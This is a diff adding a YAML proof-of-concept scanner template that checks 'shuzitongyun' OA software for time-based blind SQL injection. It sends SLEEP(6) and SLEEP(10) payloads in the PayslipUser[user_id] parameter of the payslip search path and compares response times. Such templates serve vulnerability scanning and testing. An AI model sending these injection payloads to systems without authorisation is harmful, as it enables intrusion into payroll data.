@@ -1,0 +1,24 @@
+name: poc-yaml-shuzitongyun-OA_PayslipUser-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%286%29%29%29usQE%29
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: GET
+      path: /payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%2810%29%29%29usQE%29
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.latency >= 10000 && response.latency <= 11000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/140617970
